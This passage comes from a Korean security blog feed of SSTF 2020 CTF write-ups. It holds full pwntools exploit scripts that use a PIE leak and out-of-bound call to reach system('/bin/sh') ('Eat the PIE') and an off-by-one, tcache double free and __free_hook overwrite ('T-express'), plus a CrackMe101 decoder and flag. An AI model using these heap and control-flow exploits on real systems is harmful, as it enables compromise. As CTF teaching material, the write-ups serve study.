사용되는 index의 out-of-bound네요.</p><p>그럼 대충 예상해 보면 취약점은 아래와 같습니다.</p><ol><li>NULL terminated string의 예외 처리 부재로 PIE 우회</li><li>out-of-bound로 eip 제어</li></ol><p>예상이 맞는지 한번 확인해 봅시다.</p><h1 id="Memory-Leak-with-printf"><a href="#Memory-Leak-with-printf" class="headerlink" title="Memory Leak with printf"></a>Memory Leak with printf</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image3.png"></p><p>PIE를 우회하는 법은 간단합니다. binary의 base address를 leak 하면 되니까요.</p><p>예를 들어 func1의 주소인 <code>0x5655574d</code>를 leak 했다면 <code>0x5655574d</code>에서 <code>func1</code>의 offset인 <code>0x74d</code>를 빼서 binary base address를 구할 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image4.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image5.png"></p><p>16 byte 길이의 string을 입력하면 vtable 바로 위에 저장되는 것을 확인할 수 있습니다. 이 상태로 <code>printf()</code> 실행을 트리거하면 <code>func1 ~ func4</code>의 주소도 같이 출력됩니다. <code>printf()</code>는 NULL terminated string을 다루는 함수이기 때문에 NULL을 만나기 전까진 멈추지 않고 계속 출력한 결과입니다.</p><h1 id="Out-Of-Bound"><a href="#Out-Of-Bound" class="headerlink" title="Out-Of-Bound"></a>Out-Of-Bound</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image6.png"></p><p>Indirect call에 사용될 인덱스에 따라 스택 상황을 출력한 사진에 번호를 새겨봤습니다. 좀 전에 indirect call에서 음수에 대한 예외 처리를 하지 않아 out-of-bound가 가능하다고 설명했습니다. 만약 현 상황에서 -3을 입력한다면 eip에 <code>0x42424242</code> 가 들어가겠죠?</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image7.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image8.png"></p><p>예상대로 취약점은 정말 간단합니다. 이제 exploit을 해봅시다.</p><h1 id="Exploit-Plan"><a href="#Exploit-Plan" class="headerlink" title="Exploit Plan"></a>Exploit Plan</h1><p>주어진 정보와 제약 상황 등을 고려하며 추가로 필요한 정보가 있는지 체크해봅시다.</p><ol><li><code>system()</code>을 바이너리에서 사용함.<ul><li>Arbitrary Write(AW)가 가능하다면 bss에 “/bin/sh”을 넣어주기만 하면 됨</li></ul></li><li>Libc 주소를 leak 하기 번거로움 </li><li>PIE가 있는 상황에서 stack 주소를 leak 하기 번거로움</li></ol><p>[ ! ] 결론</p><p>Arbitrary Write 할 방법을 찾자.</p><p>“/bin/sh”을 bss에 저장하고 <code>system( bss )</code>를 하면 쉘 획득 가능.</p><h1 id="Arbitrary-Write"><a href="#Arbitrary-Write" class="headerlink" title="Arbitrary Write"></a>Arbitrary Write</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image9.png"></p><p>Arbitrary Write(Write anything anywhere)를 하려면 당연히 쓰기 함수가 있어야 하겠죠?. 사용 가능한 쓰기 함수는 <code>read()</code>가 유일합니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image10.png"></p><p>out-of-bound로 <code>read()</code>를 AW에 사용하려는 지금 상황에서 넘어야 할 장애물이 2가지가 있습니다.</p><ol><li>call로 eip를 잡는다는 점</li><li><code>read()</code>는 인자를 3개나 받는다는 점</li></ol><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image11.png"></p><p>일단 첫 번째, call로 함수를 호출하기 전에 충족돼야 하는 조건이 있는데,</p><ol><li>호출당하는 함수가 쓸 인자들이 stack에 push 돼 있어야 함.</li><li>ESP가 그 인자들 중 가장 낮은 주소에 위치해야 함.</li></ol><p>적절한 gadget을 사용한다면 이 두 가지 조건을 충족하는 것은 대부분 크게 어려운 일이 아닙니다. 하지만 pyload를 담을 메모리가 16byte 밖에 없기 때문에 이마저도 어려운 일이 돼 버렸네요.</p><p>[ ! ] indexVar + gadget + parameter1 + parameter2 + parameter3 + &amp;read() = 24 byte</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image12.png"></p><p>한참 고민하다가 한 가지 생각이 머리를 스치고 갔습니다.</p><p>“32 bit의 인자 push는 역순으로 이뤄진다!” <del>이때 이마를 탁 치고 유레카를 외쳤습니다.</del></p><p>결론부터 적자면 위 사진에서 하이라이트 된 부분을 gadget으로 사용하면 됩니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image13.png"></p><p>위 사진은 <code>pwnme()</code>에서 <code>read(0, &amp;v0, 0x10)</code>에 해당하는 어셈 코드입니다. 3번째 인자부터 역순으로 stack에 push 하는 게 보이시나요? 만약 3번째 인자를 push 하는 코드를 건너뛰고 <code>&lt;pwnme+198&gt;</code>부터 실행된다면 <code>read()</code>가 호출될 때 stack에 있던 쓰레기 값( <del>사실 ret addr</del> )을 <code>read()</code>의 3번째 인자로 인식하게 됩니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image14.png"></p><p>테스트해보면 예상과 같이 <code>read(0, &amp;v0, 0x566109bc)</code>가 실행됩니다. 이 가젯을 사용한다면 16 byte 입력 제한으로 불가능했던 AW가 가능해집니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<span class="hljs-comment">#p = remote(&#x27;eat-the-pie.sstf.site&#x27;, &#x27;1337&#x27;)</span>p = process(<span class="hljs-string">&#x27;./target&#x27;</span>)e = ELF(<span class="hljs-string">&#x27;./target&#x27;</span>)read_plt = e.plt[<span class="hljs-string">&#x27;read&#x27;</span>]system = e.plt[<span class="hljs-string">&#x27;system&#x27;</span>]bss = e.bss()<span class="hljs-comment"># leak binary base</span>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">12</span> + <span class="hljs-string">&#x27;BBBB&#x27;</span>p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;BBBB&#x27;</span>)leak = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x74d</span>log.info(hex(leak))<span class="hljs-comment"># overflow vtable with gadget</span>payload = <span class="hljs-string">&#x27;-3&#x27;</span>+ <span class="hljs-string">&#x27;\x00\x00&#x27;</span> + p32(leak+<span class="hljs-number">0x970</span>) <span class="hljs-comment"># read() in pwnme() without len</span>p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)<span class="hljs-comment"># arbitrary write to bss</span>payload = p32(<span class="hljs-number">0</span>) + p32(leak+bss) + p32(<span class="hljs-number">8</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span> + p32(leak+read_plt)p.sendline(payload)p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<span class="hljs-comment"># overflow vtable with gadget</span>payload = <span class="hljs-string">&#x27;-3&#x27;</span>+ <span class="hljs-string">&#x27;\x00\x00&#x27;</span> + p32(leak+<span class="hljs-number">0x970</span>)p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)<span class="hljs-comment"># system(&quot;/bin/sh&quot;);</span>payload = <span class="hljs-string">&#x27;AAAABBBBCCCC&#x27;</span>+ p32(leak+system) + p32(leak+<span class="hljs-number">0xa99</span>) + p32(leak+bss)p.sendline(payload) <span class="hljs-comment"># 0xa99 == pop pop pop ret</span>p.interactive()</code></pre><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image15.png"></p><p>Q.E.D</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>out of bound</tag>
      
      <tag>calling convention</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF T-express</title>
    <link href="/2020/10/18/fabu1ous/sstf-t-express/"/>
    <url>/2020/10/18/fabu1ous/sstf-t-express/</url>
    
    <content type="html"><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image.png"></p><p>삼성에서 주최한 SSTF에 출전했습니다. 조금 늦은 감이 있지만 T-express 문제 풀이를 해볼까 합니다. T-express 바이너리를 실행하면 에버랜드 로고의 아스키 아트로 저희를 맞이해줍니다. 코로나 때문에 어디 놀러 가지도 못하고 있었는데 온라인으로 에버랜드에 가보네요. ㅎㅎ </p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image1.png"></p><p>T-express 바이너리는 glibc-2.31와 함께 주어진 Heap문제입니다. glibc-2.31는 2020년 2월에 릴리즈 된 버전인데,  저는 T-express를 풀면서 이 버전의 tcache를 처음 접해봤습니다. 이런 저조차 어렵지 않게 풀만큼 크게 어렵지 않고 재밌게 풀 수 있는 문제입니다.</p><p>[취약점]</p><ol><li><p>Off-By-One</p></li><li><p>Double-Free</p></li><li><p>Out-Of-Bound</p></li></ol><h1 id="훑어보기"><a href="#훑어보기" class="headerlink" title="훑어보기"></a>훑어보기</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image2.png"></p><p>프로그램의 기능은 대충 아래와 같이 요약할 수 있습니다.</p><ol><li><p>티켓 구매</p><ul><li>One Ride 티켓 → 메모리 할당</li><li>One Day 티켓 → 메모리 할당</li></ul></li><li><p>보유 중인 티켓 보기</p></li><li><p>티켓 사용</p><ul><li>One Ride 티켓 → 할당 해제</li><li>One Day 티켓 → 활동 선택 → 모든 활동 사용 → 할당 해제</li></ul></li><li><p>종료</p></li></ol><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image3.png"></p><p>구매할 수 있는 티켓의 종류는 두 가지로 나뉩니다(One Ride Ticket / One Day Ticket). 두 티켓은 3가지 차이점이 있습니다.</p><ol><li>할당 크기<ul><li>One Ride → 0x18</li><li>One Day → 0x30</li></ul></li><li>티켓 타입<ul><li>One Ride → 1</li><li>One Day → 0</li></ul></li><li>해제 조건</li></ol><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image4.png"></p><p><code>0x55d222efe2a0</code> 에는 One Ride Ticket이, <code>0x55d222efe2c0</code> 에는 One Day Ticket이 할당돼있는 모습입니다. 하이라이트 된 부분을 보시면 <code>ticket_type</code>값이 저장된 것을 볼 수 있습니다.  여기서 집중해야 할 점은 <code>lastname</code> 바로 다음에 <code>ticket_type</code>이 존재한다는 것입니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image5.png"></p><p><code>lastname</code>은 티켓이 할당된 후 함수 <code>read_str()</code>으로 입력을 받습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image6.png"></p><p>함수 <code>read_str()</code>은 입력받은 string 끝에 NULL을 추가하는 루틴이 존재합니다. 만약 <code>lastname</code>에 입력받을 때 8byte를 꽉 채워 넣는다면 <code>ticket_type</code>의 값을 오염시킬 수 있겠죠?</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image7.png"></p><p>One Ride Ticket의 <code>ticket_type</code>을 NULL(0x00)로 오염시킨 모습입니다. 그래서 이걸로 무얼 할 수 있느냐? <code>ticket_type</code>을 오염시켜 0으로 바꾸면 One Ride Ticket을 One Day Ticket인 것처럼 속일 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image8.png"></p><p>함수 <code>use_ticket()</code>의 일부입니다. <code>ticket_type</code>에 따라 분기문에서 실행되는 코드가 달라집니다. One Ride Ticket에는 존재하지 않는 <code>meal_ticket, safari_pass</code>등의 값을 조작하는 코드를 실행할 수 있고 이는 추가로 메모리 오염을 발생시킵니다.</p><h1 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h1><p>glibc-2.31 버전의 tcache는 double free를 검증하는 코드가 추가 됐습니다. 여기서 재밌는 점은 크기가 같은 tcache 끼리만 검증한다는 겁니다. 만약 청크의 size를 임의로 조작할 수 있는 방법이 있다면 같은 청크를 두 번 해제할 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image9.png"></p><p>One Ride Ticket의 <code>ticket_type</code>을 <code>0x00</code>으로 바꿔 함수 <code>use_ticket()</code>에서 One Day Ticket인 것처럼 사용할 수 있다고 설명했습니다. 그중 <code>meal_ticket</code>을 사용하면 다음 청크의 size값을 오염시킬 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image10.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image11.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image12.png"></p><p>위에서 설명한 대로 size값을 오염시킨 모습입니다. One Day Ticket을 size가 0x41일 때 한번, 0x21일 때 한번 할당 해제를 해주면 Double Free가 되겠죠?</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image13.png"></p><p>짠! 같은 주소가 두 번 해제됩니다. 이제 원하는 주소에 chunk를 할당해 Arbitrary Write를 할 수 있습니다.</p><h1 id="Out-Of-Bound"><a href="#Out-Of-Bound" class="headerlink" title="Out-Of-Bound"></a>Out-Of-Bound</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image14.png"></p><p>구매한 티켓은 <code>passes</code>라는 이름의 배열로 bss영역에 저장됩니다. 각 티켓에 해당하는 chunk의 주소를 저장하고 index를 사용해 접근합니다. 위 사진은 함수 <code>view_ticket()</code>의 일부입니다. 자세히 보시면 index를 검사하는 분기문에서 음수에 대한 예외처리를 하지 않은 것을 확인할 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image15.png"></p><p>만약 <code>passes</code> 보다 낮은 주소에 중요한 정보가 있다면 Out-Of-Bound로 출력시킬 수 있습니다. 그리고 배열 <code>passes</code>보다 조금 낮은 주소를 확인해 보면 <code>stderr@@GLIBC</code>가 있다는 걸 알 수 있습니다. </p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image16.png"></p><p>함수 <code>view_ticket()</code>에 -4를 index로 입력한다면 <code>stderr@@GLIBC</code>를 통해 libc의 base address를 leak 할 수 있습니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<span class="hljs-comment">#p = remote(&#x27;t-express.sstf.site&#x27;, &#x27;1337&#x27;)</span>p = process(<span class="hljs-string">&#x27;./target&#x27;</span>)e = ELF(<span class="hljs-string">&#x27;./target&#x27;</span>)<span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment"># init</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;AAAA&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;BBBB&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;BBBB&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;CCCC&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;CCCC&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<span class="hljs-comment"># leak libc</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;-4&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;|name |    &#x27;</span>)pad = u64(p.recv(<span class="hljs-number">4</span>)+ <span class="hljs-string">b&#x27;\x00\x00\x00\x00&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;   &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+ <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)libc_base = leak<span class="hljs-number">-0x1ec643</span>log.info(hex(libc_base))free_hook = libc_base + <span class="hljs-number">0x1eeb28</span>log.info(hex(free_hook))system = libc_base + <span class="hljs-number">0x55410</span>log.info(hex(system))<span class="hljs-comment"># double free</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x20</span>):p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)gdb.attach(p)<span class="hljs-comment"># AW</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, p64(free_hook))p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, p64(system))p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.interactive()</code></pre><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image17.png"></p><p>Q.E.D</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>out of bound</tag>
      
      <tag>off by one</tag>
      
      <tag>double free bug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF CrackMe101</title>
    <link href="/2020/10/18/idioth/sstf-crackme101/"/>
    <url>/2020/10/18/idioth/sstf-crackme101/</url>
    
    <content type="html"><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p><img src="/2020/10/18/idioth/sstf-crackme101/image.png"></p><p>64bit elf 파일임을 알 수 있습니다. Ubuntu 20.04 64bit에서 실행을 해보겠습니다.</p><p><img src="/2020/10/18/idioth/sstf-crackme101/image1.png"></p><p>Password를 입력하고 정상적인 패스워드를 입력했을 시 플래그가 나오는 형식으로 생각할 수 있습니다.</p><p>Ghidra를 사용하여 crackme101이 어떤 식으로 구동되는지 확인해보도록 하겠습니다.</p><h1 id="crackme101-분석"><a href="#crackme101-분석" class="headerlink" title="crackme101 분석"></a>crackme101 분석</h1><pre><code class="hljs cpp"><span class="hljs-function">undefined8 <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> iVar1;  <span class="hljs-keyword">size_t</span> sVar2;  <span class="hljs-keyword">long</span> in_FS_OFFSET;  <span class="hljs-keyword">int</span> local_88;  <span class="hljs-keyword">char</span> local_78 [<span class="hljs-number">104</span>];  <span class="hljs-keyword">long</span> local_10;    local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the password! : &quot;</span>);  __isoc99_scanf(&amp;DAT_0010206e,local_78);  sVar2 = <span class="hljs-built_in">strlen</span>(local_78);  iVar1 = (<span class="hljs-keyword">int</span>)sVar2;  getMaskedStr(local_78,local_78,local_78);  local_88 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> ((local_88 &lt; iVar1 &amp;&amp;         (<span class="hljs-string">&quot;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&quot;</span>[local_88] == local_78[(iVar1 - local_88) + <span class="hljs-number">-1</span>])))  &#123;    local_88 = local_88 + <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">if</span> (local_88 != iVar1) &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Login Failed!&quot;</span>);    <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>      __stack_chk_fail();    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  &#125;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Successfully logged in!\nGood job!&quot;</span>);                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre><p>입력된 패스워드는 <code>local_78</code>에 들어가게 되고 <code>iVar1</code>는 입력한 패스워드의 길이가 됩니다.</p><p><code>getMaskedStr</code> 함수에서 인자를 모두 <code>local_78</code>로 받아서 어떠한 작업을 수행한 후 “Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;” 문자열과 <code>ocal_78</code> 문자열을 뒷부분의 배열부터 <code>iVar1</code>의 크기만큼 비교합니다.</p><p><code>local_88</code>과 <code>iVar1</code>이 같아야 하려면 while 문의 조건인 각 문자열이 동일해야 하므로 <code>getMaskedStr</code> 함수를 통과한 <code>local_78</code>의 값이 어떠한 값인지 먼저 알아야 합니다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getMaskedStr</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1,<span class="hljs-keyword">long</span> param_2)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">size_t</span> sVar1;  <span class="hljs-keyword">int</span> local_18;    sVar1 = <span class="hljs-built_in">strlen</span>(param_1);  local_18 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> (local_18 &lt; (<span class="hljs-keyword">int</span>)sVar1) &#123;    *(byte *)(param_2 + local_18) =         param_1[local_18] ^ <span class="hljs-string">&quot;u7fl(3JC=UkJGEhPk&#123;q`/X5UzTI.t&amp;A]2[rPM9&quot;</span>[local_18];    local_18 = local_18 + <span class="hljs-number">1</span>;  &#125;  *(undefined *)(param_2 + (<span class="hljs-keyword">int</span>)sVar1) = <span class="hljs-number">0</span>;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p>인자로 받은 param은 입력받은 패스워드 값이 될 것입니다.</p><p>문자열의 길이만큼 “u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9”문자열과 동일한 index끼리 xor 연산을 수행하는 것을 볼 수 있습니다.</p><p>따라서 패스워드 check가 어떠한 식으로 진행이 되는지 요약해보면</p><ol><li>패스워드를 입력을 받는다.</li><li><code>getMaskedStr</code> 함수를 통해 “u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9” 문자열과 동일한 인덱스끼리 xor 연산을 수행</li><li>수행한 결과를 뒤집어서 “Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;”과 맞는지 검사</li><li>맞으면 Correct</li></ol><p>그러면 저희가 복호화할 시나리오는</p><ol><li><p>최종적으로 나올 값은 “Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;”이므로 해당 문자열과 “u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9”를 뒤집은 문자열을 xor 연산</p></li><li><p>나온 문자열을 다시 뒤집음</p></li><li><p>Get Flag!!</p></li></ol><h1 id="Decode-Code"><a href="#Decode-Code" class="headerlink" title="Decode Code"></a>Decode Code</h1><pre><code class="hljs python">key1 = <span class="hljs-string">&quot;u7fl(3JC=UkJGEhPk&#123;q`/X5UzTI.t&amp;A]2[rPM9&quot;</span>cmp_key = <span class="hljs-string">&quot;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&quot;</span>result1 = <span class="hljs-string">&quot;&quot;</span>revkey = key1[::<span class="hljs-number">-1</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key1)):    result1 += chr(ord(cmp_key[i]) ^ ord(revkey[i]))print(result1[::<span class="hljs-number">-1</span>])</code></pre><p><img src="/2020/10/18/idioth/sstf-crackme101/image2.png"></p><p>Flag : SCTF{Y0u_cR4ck3d_M3_up_t4k3_7h15_fL49}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF RC_four</title>
